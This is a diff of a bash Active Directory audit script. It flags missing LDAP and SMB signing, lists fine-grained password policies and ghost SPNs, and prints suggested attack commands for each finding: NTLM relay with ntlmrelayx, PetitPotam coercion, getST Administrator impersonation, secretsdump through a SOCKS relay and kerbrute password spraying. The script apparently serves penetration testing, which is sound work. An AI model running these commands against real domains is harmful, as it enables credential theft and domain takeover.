@@ -293,12 +293,12 @@ if [ -f "$OUTPUT_DIR/all_dcs.txt" ] && [ $DC_COUNT -gt 1 ]; then
       echo -e "${RED}[KO] All $DC_COUNT DCs: LDAP Signing + Channel Binding NOT enforced → ldap_security_check.csv${NC}"
     else
       echo -e "${RED}[KO] $VULN_COUNT/$DC_COUNT DC(s) without LDAP Signing + Channel Binding → ldap_security_check.csv${NC}"
-      echo -e "$VULN_DCS"
+      printf "$VULN_DCS"
     fi
-    FIRST_VULN_DC_IP=$(awk -F',' 'NR==2 {print $2}' "$OUTPUT_DIR/ldap_security_check.csv")
-    echo -e "${GREY}       └─ 1) ntlmrelayx.py -t ldap://${FIRST_VULN_DC_IP} --remove-mic --delegate-access${NC}"
-    echo -e "${GREY}          2) petitpotam.py -d '$DOMAIN' -u '$USERNAME' -p '$PASSWORD' <RELAY_IP> ${FIRST_VULN_DC_IP}${NC}"
-    echo -e "${GREY}          3) getST.py -spn cifs/${FIRST_VULN_DC_IP} '$DOMAIN'/\$MACHINE\$ -impersonate Administrator${NC}"
+      FIRST_VULN_LDAP_DC_IP=$(awk -F',' 'NR==2 {print $2}' "$OUTPUT_DIR/ldap_security_check.csv")
+      echo -e "${GREY}       └─ 1) ntlmrelayx.py -t ldap://${FIRST_VULN_LDAP_DC_IP} --remove-mic --delegate-access${NC}"
+      echo -e "${GREY}          2) petitpotam.py -d '$DOMAIN' -u '$USERNAME' -p '$PASSWORD' <RELAY_IP> ${FIRST_VULN_LDAP_DC_IP}${NC}"
+      echo -e "${GREY}          3) getST.py -spn cifs/${FIRST_VULN_LDAP_DC_IP} '$DOMAIN'/\$MACHINE\$ -impersonate Administrator${NC}"
   else
     echo -e "${GREEN}[OK] All DCs have LDAP Signing + Channel Binding enforced${NC}"
   fi
@@ -374,26 +374,24 @@ if [ -f "$OUTPUT_DIR/all_dcs.txt" ] && [ $DC_COUNT -gt 1 ]; then
       echo -e "${RED}[KO] All $DC_COUNT DCs: SMB Signing NOT required${NC}"
     else
       echo -e "${RED}[KO] $VULN_SMB_COUNT/$DC_COUNT DC(s) without required SMB Signing${NC}"
-      printf "$VULN_SMB_DCS"
     fi
+    printf "$VULN_SMB_DCS"
     
-    # Extract first vulnerable DC IP (once)
-    FIRST_DC_IP=$(echo "$VULN_SMB_DCS" | head -1 | grep -oP '\d+\.\d+\.\d+\.\d+')
+    # Extract first vulnerable DC IP
+    FIRST_VULN_SMB_DC_IP=$(echo -e "$VULN_SMB_DCS" | head -1 | grep -oP '\d+\.\d+\.\d+\.\d+')
     
-    # Primary exploit: Non-DC relay targets
     if [ "$RELAY_COUNT" -gt 0 ]; then
       echo -e "${RED}       └─ Exploitable: Coerce DC to non-DC relay targets${NC}"
       echo -e "${GREY}          1) ntlmrelayx.py -tf '$OUTPUT_DIR/relay_targets.txt' -smb2support${NC}"
-      echo -e "${GREY}          2) petitpotam.py -d '$DOMAIN' -u '$USERNAME' -p '$PASSWORD' <RELAY_IP> ${FIRST_DC_IP}${NC}"
+      echo -e "${GREY}          2) petitpotam.py -d '$DOMAIN' -u '$USERNAME' -p '$PASSWORD' <RELAY_IP> ${FIRST_VULN_SMB_DC_IP}${NC}"
     else
-      echo -e "${GREEN}       └─ Not exploitable via relay: No targets without SMB Signing found${NC}"
+      echo -e "${GREEN}       └─ Not directly exploitable: No non-DC relay targets${NC}"
     fi
-    
-    # Additional info: SOCKS access
-    echo -e "${GREY}       └─ Additionally: SOCKS Relay for share enumeration${NC}"
-    echo -e "${GREY}          1) ntlmrelayx.py -t smb://${FIRST_DC_IP} -smb2support -socks${NC}"
-    echo -e "${GREY}          2) petitpotam.py -d '$DOMAIN' -u '$USERNAME' -p '$PASSWORD' <RELAY_IP> ${FIRST_DC_IP}${NC}"
-    echo -e "${GREY}          3) proxychains4 impacket-smbclient -no-pass '${DOMAIN}/ADMINISTRATOR\$@${FIRST_DC_IP}'${NC}"
+    echo -e "${GREY}       └─ Passive SOCKS relay: Coerce users to DC${NC}"
+    echo -e "${GREY}          1) ntlmrelayx.py -t smb://${FIRST_VULN_SMB_DC_IP} -smb2support -socks${NC}"
+    echo -e "${GREY}          2) petitpotam.py -d '$DOMAIN' -u '$USERNAME' -p '$PASSWORD' <RELAY_IP> <NON_DC_HOST>${NC}"
+    echo -e "${GREY}          3) proxychains4 impacket-smbclient -no-pass '${DOMAIN}/<HOST>\$@${FIRST_VULN_SMB_DC_IP}'${NC}"
+    echo -e "${GREY}          4) Privileged users could dump: proxychains4 impacket-secretsdump -no-pass '${DOMAIN}/<USER>@${FIRST_VULN_SMB_DC_IP}'${NC}"
   else
     echo -e "${GREEN}[OK] All DCs have SMB Signing required${NC}"
   fi
@@ -414,10 +412,10 @@ else
       echo -e "${GREEN}       └─ Not exploitable via relay: No targets without SMB Signing found${NC}"
     fi
     
-    # Additional info: SOCKS access
+    # SOCKS access - coerce any other host to DC
     echo -e "${GREY}       └─ Additionally: SOCKS Relay for share enumeration${NC}"
     echo -e "${GREY}          1) ntlmrelayx.py -t smb://${DC_IP} -smb2support -socks${NC}"
-    echo -e "${GREY}          2) petitpotam.py -d '$DOMAIN' -u '$USERNAME' -p '$PASSWORD' <RELAY_IP> ${DC_IP}${NC}"
+    echo -e "${GREY}          2) petitpotam.py -d '$DOMAIN' -u '$USERNAME' -p '$PASSWORD' <RELAY_IP> <ANY_OTHER_HOST>${NC}"
     echo -e "${GREY}          3) proxychains4 impacket-smbclient -no-pass '${DOMAIN}/ADMINISTRATOR\$@${DC_IP}'${NC}"
   fi
 fi
@@ -657,6 +655,23 @@ else
 fi
 echo -e "${GREY}       └─ kerbrute passwordspray -d ${DOMAIN} '${OUTPUT_DIR}/domain_users.txt' --user-as-pass${NC}"
 
+# Check for Fine-Grained Password Policies
+FGPP_COUNT=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" \
+  -b "CN=Password Settings Container,CN=System,$DOMAIN_DN" \
+  "(objectClass=*)" dn 2>/dev/null | \
+  grep "^dn: CN=" | grep -v "^dn: CN=Password Settings Container" | wc -l)
+
+if [ "$FGPP_COUNT" -gt 0 ]; then
+  echo -e "${GREEN}[OK] $FGPP_COUNT Fine-Grained Password Policies detected (details require elevated privileges)${NC}"
+  ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" \
+    -b "CN=Password Settings Container,CN=System,$DOMAIN_DN" \
+    "(objectClass=*)" dn 2>/dev/null | \
+    grep "^dn: CN=" | grep -v "^dn: CN=Password Settings Container" | \
+    sed 's/dn: CN=\([^,]*\).*/\1/' | while read -r policy; do
+      echo -e "${GREY}       └─ $policy${NC}"
+    done
+fi
+
 echo ""
 
 # Ghost SPN Check
@@ -711,7 +726,7 @@ if [ ! -z "$GHOST_SPNS" ]; then
   
 if [ "$GHOST_COUNT" -gt 0 ]; then
   echo -e "${RED}[KO] $GHOST_COUNT Ghost SPN(s) found (potential SPN hijacking)${NC}"
-  echo -e "$GHOST_LIST"
+  printf "$GHOST_LIST"
   if [ ! -z "$MAQ" ] && [ "$MAQ" -gt 0 ]; then
     FIRST_GHOST=$(echo -e "$GHOST_LIST" | head -1 | grep -oP '(?<=TERMSRV/|HOST/|RestrictedKrbHost/|HTTP/)[^$]+' | head -1)
     if [ ! -z "$FIRST_GHOST" ]; then
